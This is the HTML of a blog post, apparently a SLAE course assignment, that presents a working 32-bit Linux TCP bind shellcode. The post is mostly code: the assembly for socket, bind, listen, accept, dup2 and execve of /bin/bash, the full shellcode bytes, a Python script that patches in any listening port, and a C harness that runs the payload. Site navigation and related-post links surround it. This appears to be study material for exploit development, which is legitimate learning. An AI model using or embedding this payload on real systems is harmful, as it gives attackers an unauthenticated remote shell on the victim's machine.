    <span class="nf">mov</span> <span class="nb">bl</span><span class="p">,</span> <span class="mh">0x2</span>         <span class="c1">; int domain -&gt; AF_INET</span>
    <span class="nf">inc</span> <span class="nb">ecx</span>             <span class="c1">; int type -&gt; SOCK_STREAM</span>
    <span class="nf">mov</span> <span class="nb">dl</span><span class="p">,</span> <span class="mh">0x6</span>         <span class="c1">; int protocol -&gt; IPPROTO_TCP</span>
    <span class="nf">int</span> <span class="mh">0x80</span>            <span class="c1">; sys_socket</span>
    <span class="nf">mov</span> <span class="nb">edi</span><span class="p">,</span> <span class="nb">eax</span>        <span class="c1">; save socket fd</span>

    <span class="c1">; Create addr struct</span>
    <span class="nf">xor</span> <span class="nb">edx</span><span class="p">,</span> <span class="nb">edx</span>
    <span class="nf">push</span> <span class="nb">edx</span>            <span class="c1">; NULL padding</span>
    <span class="nf">push</span> <span class="nb">edx</span>            <span class="c1">; NULL padding</span>
    <span class="nf">push</span> <span class="nb">edx</span>            <span class="c1">; sin.addr (0.0.0.0)</span>
    <span class="nf">push</span> <span class="kt">word</span> <span class="mh">0x5c11</span>    <span class="c1">; Port</span>
    <span class="nf">push</span> <span class="kt">word</span> <span class="mh">0x2</span>       <span class="c1">; AF_INET</span>
    <span class="nf">mov</span> <span class="nb">esi</span><span class="p">,</span> <span class="nb">esp</span>

    <span class="c1">; Bind socket</span>
    <span class="nf">mov</span> <span class="nb">ax</span><span class="p">,</span> <span class="mh">0x169</span>       <span class="c1">; sys_bind</span>
    <span class="nf">mov</span> <span class="nb">ebx</span><span class="p">,</span> <span class="nb">edi</span>        <span class="c1">; int sockfd -&gt; saved socket fd</span>
    <span class="nf">mov</span> <span class="nb">ecx</span><span class="p">,</span> <span class="nb">esi</span>        <span class="c1">; const struct sockaddr *addr</span>
    <span class="nf">mov</span> <span class="nb">dl</span><span class="p">,</span> <span class="mh">0x10</span>        <span class="c1">; socklen_t addrlen</span>
    <span class="nf">int</span> <span class="mh">0x80</span>            <span class="c1">; sys_bind</span>

    <span class="c1">; Listen for connection</span>
    <span class="nf">mov</span> <span class="nb">ax</span><span class="p">,</span> <span class="mh">0x16b</span>       <span class="c1">; sys_listen</span>
    <span class="nf">mov</span> <span class="nb">ebx</span><span class="p">,</span> <span class="nb">edi</span>        <span class="c1">; int sockfd -&gt; saved socket fd</span>
    <span class="nf">xor</span> <span class="nb">ecx</span><span class="p">,</span> <span class="nb">ecx</span>        <span class="c1">; int backlog -&gt; NULL</span>
    <span class="nf">int</span> <span class="mh">0x80</span>            <span class="c1">; sys_socketcall (SYS_LISTEN)</span>

    <span class="c1">; Accept connection</span>
    <span class="nf">mov</span> <span class="nb">ax</span><span class="p">,</span> <span class="mh">0x16c</span>       <span class="c1">; sys_accept4</span>
    <span class="nf">mov</span> <span class="nb">ebx</span><span class="p">,</span> <span class="nb">edi</span>        <span class="c1">; int sockfd -&gt; saved sock fd value</span>
    <span class="nf">xor</span> <span class="nb">ecx</span><span class="p">,</span> <span class="nb">ecx</span>        <span class="c1">; struct sockaddr *addr -&gt; NULL</span>
    <span class="nf">xor</span> <span class="nb">edx</span><span class="p">,</span> <span class="nb">edx</span>        <span class="c1">; socklen_t *addrlen -&gt; NULL</span>
    <span class="nf">xor</span> <span class="nb">esi</span><span class="p">,</span> <span class="nb">esi</span>
    <span class="nf">int</span> <span class="mh">0x80</span>            <span class="c1">; sys_socketcall (SYS_ACCEPT)</span>
    <span class="nf">mov</span> <span class="nb">edi</span><span class="p">,</span> <span class="nb">eax</span>        <span class="c1">; save the new fd</span>

    <span class="c1">; Redirect STDIN, STDOUT, STDERR to socket</span>
    <span class="nf">xor</span> <span class="nb">ecx</span><span class="p">,</span> <span class="nb">ecx</span>
    <span class="nf">mov</span> <span class="nb">cl</span><span class="p">,</span> <span class="mh">0x3</span>         <span class="c1">; counter for loop (stdin to stderr)</span>
    <span class="nf">mov</span> <span class="nb">ebx</span><span class="p">,</span> <span class="nb">edi</span>        <span class="c1">; socket fd</span>

    <span class="nl">dup2:</span>
    <span class="nf">mov</span> <span class="nb">al</span><span class="p">,</span> <span class="mh">0x3f</span>        <span class="c1">; sys_dup2</span>
    <span class="nf">dec</span> <span class="nb">ecx</span>
    <span class="nf">int</span> <span class="mh">0x80</span>            <span class="c1">; sys_dup2</span>
    <span class="nf">inc</span> <span class="nb">ecx</span>
    <span class="nf">loop</span> <span class="nv">dup2</span>

    <span class="c1">; execve()</span>
    <span class="nf">xor</span> <span class="nb">eax</span><span class="p">,</span> <span class="nb">eax</span>
    <span class="nf">push</span> <span class="mh">0x41687361</span>     <span class="c1">; ///bin/bashA</span>
    <span class="nf">push</span> <span class="mh">0x622f6e69</span>
    <span class="nf">push</span> <span class="mh">0x622f2f2f</span>
    <span class="nf">mov</span> <span class="kt">byte</span> <span class="p">[</span><span class="nb">esp</span> <span class="o">+</span> <span class="mi">11</span><span class="p">],</span> <span class="nb">al</span> <span class="c1">; NULL terminate string</span>
    <span class="nf">mov</span> <span class="nb">al</span><span class="p">,</span> <span class="mh">0xb</span>         <span class="c1">; sys_execve</span>
    <span class="nf">mov</span> <span class="nb">ebx</span><span class="p">,</span> <span class="nb">esp</span>        <span class="c1">; const char *filename</span>
    <span class="nf">xor</span> <span class="nb">ecx</span><span class="p">,</span> <span class="nb">ecx</span>        <span class="c1">; char *const argv[]</span>
    <span class="nf">xor</span> <span class="nb">edx</span><span class="p">,</span> <span class="nb">edx</span>        <span class="c1">; char *const envp[]</span>
    <span class="nf">int</span> <span class="mh">0x80</span>            <span class="c1">; sys_execve</span>
</pre></td></tr></tbody></table></code></div></div>

<p>If we want to change the listening port, we can modify the assembly code and re-compile it but instead it would be more convenient to use a small python script that will automatically replace the port in the shellcode.</p>

<p>The following script replaces the hardcoded port <code class="language-plaintext highlighter-rouge">4444</code> from the shellcode with the port supplied at the command line. The script also gives a warning if any null bytes are contained in the modified shellcode. Depending on which port is being used, it’s possible some values may generate null bytes.</p>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
</pre></td><td class="rouge-code"><pre><span class="c1">#!/usr/bin/python
</span>
<span class="kn">import</span> <span class="nn">socket</span>
<span class="kn">import</span> <span class="nn">sys</span>

<span class="n">shellcode</span> <span class="o">=</span>  <span class="s">'</span><span class="se">\\</span><span class="s">x31</span><span class="se">\\</span><span class="s">xc0</span><span class="se">\\</span><span class="s">x31</span><span class="se">\\</span><span class="s">xdb</span><span class="se">\\</span><span class="s">x31</span><span class="se">\\</span><span class="s">xc9</span><span class="se">\\</span><span class="s">x31</span><span class="se">\\</span><span class="s">xd2</span><span class="se">\\</span><span class="s">xb0</span><span class="se">\\</span><span class="s">x66</span><span class="se">\\</span><span class="s">xb3</span><span class="se">\\</span><span class="s">x01</span><span class="se">\\</span><span class="s">x6a</span><span class="se">\\</span><span class="s">x06</span><span class="se">\\</span><span class="s">x6a</span><span class="se">\\</span><span class="s">x01'</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="s">'</span><span class="se">\\</span><span class="s">x6a</span><span class="se">\\</span><span class="s">x02</span><span class="se">\\</span><span class="s">x89</span><span class="se">\\</span><span class="s">xe1</span><span class="se">\\</span><span class="s">xcd</span><span class="se">\\</span><span class="s">x80</span><span class="se">\\</span><span class="s">x89</span><span class="se">\\</span><span class="s">xc7</span><span class="se">\\</span><span class="s">x52</span><span class="se">\\</span><span class="s">x52</span><span class="se">\\</span><span class="s">x52</span><span class="se">\\</span><span class="s">x66</span><span class="se">\\</span><span class="s">x68</span><span class="se">\\</span><span class="s">x11</span><span class="se">\\</span><span class="s">x5c</span><span class="se">\\</span><span class="s">x66'</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="s">'</span><span class="se">\\</span><span class="s">x6a</span><span class="se">\\</span><span class="s">x02</span><span class="se">\\</span><span class="s">x89</span><span class="se">\\</span><span class="s">xe6</span><span class="se">\\</span><span class="s">xb0</span><span class="se">\\</span><span class="s">x66</span><span class="se">\\</span><span class="s">xb3</span><span class="se">\\</span><span class="s">x02</span><span class="se">\\</span><span class="s">x6a</span><span class="se">\\</span><span class="s">x10</span><span class="se">\\</span><span class="s">x56</span><span class="se">\\</span><span class="s">x57</span><span class="se">\\</span><span class="s">x89</span><span class="se">\\</span><span class="s">xe1</span><span class="se">\\</span><span class="s">xcd</span><span class="se">\\</span><span class="s">x80'</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="s">'</span><span class="se">\\</span><span class="s">xb0</span><span class="se">\\</span><span class="s">x66</span><span class="se">\\</span><span class="s">xb3</span><span class="se">\\</span><span class="s">x04</span><span class="se">\\</span><span class="s">x52</span><span class="se">\\</span><span class="s">x57</span><span class="se">\\</span><span class="s">x89</span><span class="se">\\</span><span class="s">xe1</span><span class="se">\\</span><span class="s">xcd</span><span class="se">\\</span><span class="s">x80</span><span class="se">\\</span><span class="s">xb0</span><span class="se">\\</span><span class="s">x66</span><span class="se">\\</span><span class="s">xb3</span><span class="se">\\</span><span class="s">x05</span><span class="se">\\</span><span class="s">x52</span><span class="se">\\</span><span class="s">x52'</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="s">'</span><span class="se">\\</span><span class="s">x57</span><span class="se">\\</span><span class="s">x89</span><span class="se">\\</span><span class="s">xe1</span><span class="se">\\</span><span class="s">xcd</span><span class="se">\\</span><span class="s">x80</span><span class="se">\\</span><span class="s">x89</span><span class="se">\\</span><span class="s">xc7</span><span class="se">\\</span><span class="s">x31</span><span class="se">\\</span><span class="s">xc9</span><span class="se">\\</span><span class="s">xb1</span><span class="se">\\</span><span class="s">x03</span><span class="se">\\</span><span class="s">x89</span><span class="se">\\</span><span class="s">xfb</span><span class="se">\\</span><span class="s">xb0</span><span class="se">\\</span><span class="s">x3f</span><span class="se">\\</span><span class="s">x49'</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="s">'</span><span class="se">\\</span><span class="s">xcd</span><span class="se">\\</span><span class="s">x80</span><span class="se">\\</span><span class="s">x41</span><span class="se">\\</span><span class="s">xe2</span><span class="se">\\</span><span class="s">xf8</span><span class="se">\\</span><span class="s">x31</span><span class="se">\\</span><span class="s">xc0</span><span class="se">\\</span><span class="s">x68</span><span class="se">\\</span><span class="s">x61</span><span class="se">\\</span><span class="s">x73</span><span class="se">\\</span><span class="s">x68</span><span class="se">\\</span><span class="s">x41</span><span class="se">\\</span><span class="s">x68</span><span class="se">\\</span><span class="s">x69</span><span class="se">\\</span><span class="s">x6e</span><span class="se">\\</span><span class="s">x2f'</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="s">'</span><span class="se">\\</span><span class="s">x62</span><span class="se">\\</span><span class="s">x68</span><span class="se">\\</span><span class="s">x2f</span><span class="se">\\</span><span class="s">x2f</span><span class="se">\\</span><span class="s">x2f</span><span class="se">\\</span><span class="s">x62</span><span class="se">\\</span><span class="s">x88</span><span class="se">\\</span><span class="s">x44</span><span class="se">\\</span><span class="s">x24</span><span class="se">\\</span><span class="s">x0b</span><span class="se">\\</span><span class="s">xb0</span><span class="se">\\</span><span class="s">x0b</span><span class="se">\\</span><span class="s">x89</span><span class="se">\\</span><span class="s">xe3</span><span class="se">\\</span><span class="s">x31</span><span class="se">\\</span><span class="s">xc9'</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="s">'</span><span class="se">\\</span><span class="s">x31</span><span class="se">\\</span><span class="s">xd2</span><span class="se">\\</span><span class="s">xcd</span><span class="se">\\</span><span class="s">x80'</span>

<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">:</span>
    <span class="k">print</span><span class="p">(</span><span class="s">'Usage: {name} [port]'</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">name</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]))</span>
    <span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>

<span class="n">port</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
<span class="n">port_htons</span> <span class="o">=</span> <span class="nb">hex</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">htons</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">port</span><span class="p">)))</span>

<span class="n">byte1</span> <span class="o">=</span> <span class="n">port_htons</span><span class="p">[</span><span class="mi">4</span><span class="p">:]</span>
<span class="k">if</span> <span class="n">byte1</span> <span class="o">==</span> <span class="s">''</span><span class="p">:</span>
    <span class="n">byte1</span> <span class="o">=</span> <span class="s">'0'</span>
<span class="n">byte2</span> <span class="o">=</span> <span class="n">port_htons</span><span class="p">[</span><span class="mi">2</span><span class="p">:</span><span class="mi">4</span><span class="p">]</span>
<span class="n">shellcode</span> <span class="o">=</span> <span class="n">shellcode</span><span class="p">.</span><span class="n">replace</span><span class="p">(</span><span class="s">'</span><span class="se">\\</span><span class="s">x11</span><span class="se">\\</span><span class="s">x5c'</span><span class="p">,</span> <span class="s">'</span><span class="se">\\</span><span class="s">x{}</span><span class="se">\\</span><span class="s">x{}'</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">byte1</span><span class="p">,</span> <span class="n">byte2</span><span class="p">))</span>

<span class="k">print</span><span class="p">(</span><span class="s">'Here</span><span class="se">\'</span><span class="s">s the shellcode using port {port}:'</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">port</span> <span class="o">=</span> <span class="n">port</span><span class="p">))</span>
<span class="k">print</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span>

<span class="k">if</span> <span class="s">'</span><span class="se">\\</span><span class="s">x0</span><span class="se">\\</span><span class="s">'</span> <span class="ow">in</span> <span class="n">shellcode</span> <span class="ow">or</span> <span class="s">'</span><span class="se">\\</span><span class="s">x00</span><span class="se">\\</span><span class="s">'</span> <span class="ow">in</span> <span class="n">shellcode</span><span class="p">:</span>
    <span class="k">print</span><span class="p">(</span><span class="s">'##################################'</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="s">'Warning: Null byte in shellcode!'</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="s">'##################################'</span><span class="p">)</span>
</pre></td></tr></tbody></table></code></div></div>

<p>Here’s the script in action:</p>
<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre>slemire@slae:~/slae32/assignment1$ ./prepare.py 5555
Here's the shellcode using port 5555:
\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x66\xb3\x01\x6a\x06\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc7\x52\x52\x52\x66\x68\x15\xb3\x66\x6a\x02\x89\xe6\xb0\x66\xb3\x02\x6a\x10\x56\x57\x89\xe1\xcd\x80\xb0\x66\xb3\x04\x52\x57\x89\xe1\xcd\x80\xb0\x66\xb3\x05\x52\x52\x57\x89\xe1\xcd\x80\x89\xc7\x31\xc9\xb1\x03\x89\xfb\xb0\x3f\x49\xcd\x80\x41\xe2\xf8\x31\xc0\x68\x61\x73\x68\x41\x68\x69\x6e\x2f\x62\x68\x2f\x2f\x2f\x62\x88\x44\x24\x0b\xb0\x0b\x89\xe3\x31\xc9\x31\xd2\xcd\x80
</pre></td></tr></tbody></table></code></div></div>

<p>The shellcode is then added to the test program.</p>
<div class="language-c highlighter-rouge"><div class="code-header">
        <span data-label-text="C"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre></td><td class="rouge-code"><pre><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span>
<span class="kt">char</span> <span class="n">shellcode</span><span class="p">[]</span><span class="o">=</span><span class="s">"</span><span class="se">\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x66\xb3\x01\x6a\x06\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc7\x52\x52\x52\x66\x68\x15\xb3\x66\x6a\x02\x89\xe6\xb0\x66\xb3\x02\x6a\x10\x56\x57\x89\xe1\xcd\x80\xb0\x66\xb3\x04\x52\x57\x89\xe1\xcd\x80\xb0\x66\xb3\x05\x52\x52\x57\x89\xe1\xcd\x80\x89\xc7\x31\xc9\xb1\x03\x89\xfb\xb0\x3f\x49\xcd\x80\x41\xe2\xf8\x31\xc0\x68\x61\x73\x68\x41\x68\x69\x6e\x2f\x62\x68\x2f\x2f\x2f\x62\x88\x44\x24\x0b\xb0\x0b\x89\xe3\x31\xc9\x31\xd2\xcd\x80</span><span class="s">"</span><span class="p">;</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
<span class="p">{</span>
        <span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">ret</span><span class="p">)()</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int</span><span class="p">(</span><span class="o">*</span><span class="p">)())</span><span class="n">shellcode</span><span class="p">;</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"Size: %d bytes.</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">));</span> 
        <span class="n">ret</span><span class="p">();</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div>


</div>

<div class="post-tail-wrapper text-muted">

  <!-- categories -->
  
  <div class="post-meta mb-3">
    <i class="far fa-folder-open fa-fw mr-1"></i>
    
      <a href='/categories/slae/'>slae</a>,
      <a href='/categories/infosec/'>infosec</a>
  </div>
  

  <!-- tags -->
  
  <div class="post-tags">
    <i class="fa fa-tags fa-fw mr-1"></i>
      
      <a href="/tags/slae/"
          class="post-tag no-text-decoration" >slae</a>
      
      <a href="/tags/assembly/"
          class="post-tag no-text-decoration" >assembly</a>
      
      <a href="/tags/tcp-bind-shellcode/"
          class="post-tag no-text-decoration" >tcp bind shellcode</a>
      
  </div>
  

  <div class="post-tail-bottom
    d-flex justify-content-between align-items-center mt-3 pt-5 pb-2">
    <div class="license-wrapper">

      

        

        This post is licensed under 
        <a href="https://creativecommons.org/licenses/by/4.0/">
          CC BY 4.0
        </a>
         by the author.

      
    </div>

    <!--
 Post sharing snippet
-->

<div class="share-wrapper">
  <span class="share-label text-muted mr-1">Share</span>
  <span class="share-icons">
    
    
    

    
      
        <a href="https://twitter.com/intent/tweet?text=TCP+bind+shellcode+-+Ankit+Kanojiya&url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2Ftcp-bind-shellcode%2F" data-toggle="tooltip" data-placement="top"
          title="Twitter" target="_blank" rel="noopener" aria-label="Twitter">
          <i class="fa-fw fab fa-twitter"></i>
        </a>
    
      
        <a href="https://www.facebook.com/sharer/sharer.php?title=TCP+bind+shellcode+-+Ankit+Kanojiya&u=http%3A%2F%2Flocalhost%3A4000%2Fposts%2Ftcp-bind-shellcode%2F" data-toggle="tooltip" data-placement="top"
          title="Facebook" target="_blank" rel="noopener" aria-label="Facebook">
          <i class="fa-fw fab fa-facebook-square"></i>
        </a>
    
      
        <a href="https://t.me/share/url?url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2Ftcp-bind-shellcode%2F&text=TCP+bind+shellcode+-+Ankit+Kanojiya" data-toggle="tooltip" data-placement="top"
          title="Telegram" target="_blank" rel="noopener" aria-label="Telegram">
          <i class="fa-fw fab fa-telegram"></i>
        </a>
    

    <i id="copy-link" class="fa-fw fas fa-link small"
        data-toggle="tooltip" data-placement="top"
        title="Copy link"
        data-title-succeed="Link copied successfully!">
    </i>

  </span>
</div>


  </div><!-- .post-tail-bottom -->

</div><!-- div.post-tail-wrapper -->


      
    
    

    </div>
  </div> <!-- #core-wrapper -->

  <!-- panel -->
  <div id="panel-wrapper" class="col-xl-3 pl-2 text-muted">

    <div class="access">
      















      















  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        



  <div id="access-tags">
    <div class="panel-heading">Trending Tags</div>
    <div class="d-flex flex-wrap mt-3 mb-1 mr-3">

    
      
      <a class="post-tag" href="/tags/assembly/">assembly</a>
    
      
      <a class="post-tag" href="/tags/binary-exploit/">binary exploit</a>
    
      
      <a class="post-tag" href="/tags/cobalt-strike/">Cobalt Strike</a>
    
      
      <a class="post-tag" href="/tags/favicon/">favicon</a>
    
      
      <a class="post-tag" href="/tags/google-analytics/">google analytics</a>
    
      
      <a class="post-tag" href="/tags/hackthebox/">hackthebox</a>
    
      
      <a class="post-tag" href="/tags/icedid/">IcedID</a>
    
      
      <a class="post-tag" href="/tags/kerberos/">kerberos</a>
    
      
      <a class="post-tag" href="/tags/ms-samr/">MS-SAMR</a>
    
      
      <a class="post-tag" href="/tags/networkminer/">NetworkMiner</a>
    

    </div>
  </div>


    </div>

    
      
      



<!-- BS-toc.js will be loaded at medium priority -->
<script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script>

<div id="toc-wrapper" class="pl-0 pr-4 mb-5">
  <div class="panel-heading pl-3 pt-2 mb-2">Contents</div>
  <nav id="toc" data-toggle="toc"></nav>
</div>


    
  </div>

</div>

<!-- tail -->

<div class="row">
  <div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 pl-3 pr-3 pr-xl-4 mt-5">
    
      
      <!--
 Recommend the other 3 posts according to the tags and categories of the current post,
 if the number is not enough, use the other latest posts to supplement.
-->

<!-- The total size of related posts  -->


<!-- An random integer that bigger than 0  -->


<!-- Equals to TAG_SCORE / {max_categories_hierarchy}  -->








  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  
    






<!-- Fill with the other newlest posts  -->



  
    
    
      
      
        
        
        
      
    
  
    
    
      
      
        
        
        
          



  <div id="related-posts" class="mb-2 mb-sm-4">
    <h3 class="pt-2 mb-4 ml-1"
      data-toc-skip>Further Reading</h3>
    <div class="card-deck mb-4">
    
      
      
      <div class="card">
        <a href="/posts/htb-writeup-smasher/">
          <div class="card-body">
            <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->





<em class="small"
    data-ts="1542988800"
    data-df="ll"
    >
  Nov 24, 2018
</em>

            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>Smasher - Hack The Box</h3>
            <div class="text-muted small">
              <p>
                





                Linux / 10.10.10.89



This blog post is a writeup of the excellent Hack the Box machine created by dzonerzy.

Summary


  The webserver used is vulnerable to a path traversal bug and buffer overfl...
              </p>
            </div>
          </div>
        </a>
      </div>
    
      
      
      <div class="card">
        <a href="/posts/MalwareTraffic-1/">
          <div class="card-body">
            <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->





<em class="small"
    data-ts="1668441600"
    data-df="ll"
    >
  Nov 15, 2022
</em>

            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>2022-03-21 - TRAFFIC ANALYSIS EXERCISE - BURNINCANDLE</h3>
            <div class="text-muted small">
              <p>
                





                2022-03-21 - TRAFFIC ANALYSIS EXERCISE - BURNINCANDLE

SCENARIO

Exercise Link

Zip archive of the pcap: 2022-03-21-traffic-analysis-exercise.pcap.zip 4.9 MB (4,942,730 bytes)

LAN segment data:


...
              </p>
            </div>
          </div>
        </a>
      </div>
    
      
      
      <div class="card">
        <a href="/posts/CyberConFinals/">
          <div class="card-body">
            <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->





<em class="small"
    data-ts="1668441600"
    data-df="ll"
    >
  Nov 15, 2022
</em>

            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>R2D2 Backdoor - Memory Forensics</h3>
            <div class="text-muted small">
              <p>
                





                Hey all and welcome once more to my blog. This past weekend i had the privilege to create a forensics challenge for the CyberCon Finals CTF which was held at USIU University. Top 4 Proffesional tea...
              </p>
            </div>
          </div>
        </a>
      </div>
    
    </div> <!-- .card-deck -->
  </div> <!-- #related-posts -->


    
      
      <!--
  Navigation buttons at the bottom of the post.
-->

<div class="post-navigation d-flex justify-content-between">
  
  <div class="btn btn-outline-primary disabled"
    prompt="Older">
    <p>-</p>
  </div>
  

  
  <a href="/posts/htb-writeup-smasher/" class="btn btn-outline-primary"
    prompt="Newer">
    <p>Smasher - Hack The Box</p>
  </a>
  

</div>

    
      
      <!--  The comments switcher -->


    
  </div>
</div>


      </div>

      <!--
  The Search results
-->
<div id="search-result-wrapper" class="d-flex justify-content-center unloaded">
  <div class="col-12 col-sm-11 post-content">
    <div id="search-hints">
      















  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        



  <div id="access-tags">
    <div class="panel-heading">Trending Tags</div>
    <div class="d-flex flex-wrap mt-3 mb-1 mr-3">

    
      
      <a class="post-tag" href="/tags/assembly/">assembly</a>
    
      
      <a class="post-tag" href="/tags/binary-exploit/">binary exploit</a>
    
      
      <a class="post-tag" href="/tags/cobalt-strike/">Cobalt Strike</a>
    
      
      <a class="post-tag" href="/tags/favicon/">favicon</a>
    
      
      <a class="post-tag" href="/tags/google-analytics/">google analytics</a>
    
      
      <a class="post-tag" href="/tags/hackthebox/">hackthebox</a>
    
      
      <a class="post-tag" href="/tags/icedid/">IcedID</a>
    
      
      <a class="post-tag" href="/tags/kerberos/">kerberos</a>
    
      
      <a class="post-tag" href="/tags/ms-samr/">MS-SAMR</a>
    
      
      <a class="post-tag" href="/tags/networkminer/">NetworkMiner</a>
    

    </div>
  </div>


    </div>
    <div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div>
  </div>
</div>


    </div> <!-- #main-wrapper -->

    <!-- The Footer -->

<footer>
  <div class="container pl-lg-4 pr-lg-4">
    <div class="d-flex justify-content-between align-items-center text-muted ml-md-3 mr-md-3">
      <div class="footer-left">
        <p class="mb-0">
          © 2022
